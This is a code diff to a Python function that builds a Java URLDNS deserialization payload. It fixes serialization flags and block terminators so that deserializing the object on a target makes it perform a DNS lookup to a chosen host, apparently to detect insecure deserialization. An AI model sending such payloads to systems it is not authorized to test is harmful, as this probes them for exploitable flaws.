@@ -77,8 +77,11 @@ def _build_java_urldns_payload(host):
     buf += _java_utf("java.net.URL")
     # URL.serialVersionUID = -7627629688361524110L
     buf += struct.pack(">q", -7627629688361524110)
-    # Flags: SC_SERIALIZABLE
-    buf += b"\x02"
+    # Flags: SC_SERIALIZABLE | SC_WRITE_METHOD. URL has a custom readObject
+    # that re-attaches the transient `handler` field after deserialization —
+    # without SC_WRITE_METHOD the deserializer skips it, leaving handler
+    # null so URL.hashCode() NPEs before the DNS lookup fires.
+    buf += b"\x03"
     # Field count: 7 (hashCode, port, authority, file, host, protocol, ref)
     buf += struct.pack(">H", 7)
     buf += b"I" + _java_utf("hashCode")
@@ -97,6 +100,10 @@ def _build_java_urldns_payload(host):
     buf += b"\x74" + _java_utf(host)  # host
     buf += b"\x74" + _java_utf("http")  # protocol
     buf += b"\x70"  # ref: TC_NULL
+    # SC_WRITE_METHOD requires TC_ENDBLOCKDATA to close URL's custom
+    # writeObject block. URL's writeObject just calls defaultWriteObject
+    # and adds no extra data, but the terminator is still required.
+    buf += b"\x78"
     # Entry value: TC_NULL (HashMap allows null values)
     buf += b"\x70"
     # TC_ENDBLOCKDATA closes HashMap's custom block
